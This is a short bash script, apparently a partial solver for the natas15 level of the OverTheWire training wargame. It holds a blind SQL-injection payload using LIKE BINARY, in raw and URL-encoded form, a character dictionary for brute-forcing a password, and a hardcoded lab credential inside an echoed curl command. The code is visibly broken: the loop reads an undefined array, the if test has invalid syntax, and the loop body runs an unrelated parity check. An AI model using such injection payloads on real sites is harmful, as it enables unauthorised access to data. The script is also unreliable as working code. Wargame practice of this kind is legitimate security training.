#!/usr/bin/bash

# Constants
url=http://natas15.natas.labs.overthewire.org/index.php
dict="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
passlen=17              # Example: AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
sql='?username=natas16" AND password LIKE BINARY "%'
encSql="?username=natas16%22%20AND%20password%20LIKE%20BINARY%20%22%25"

# Creates an Array based on the dictionary
split=$(echo "${dict}" | sed -rn 's/(.)/\1\n/gp')
arr=(${split})

# Array to store found letters.  http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_10_02.html
found=()

echo "Start..."
for i in "${array[@]}"
do
    echo $i
    if [expr "$i % 2" eq 0] then
        echo " - PAR"
    fi
done

echo "curl -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J ${url}/${encSql}"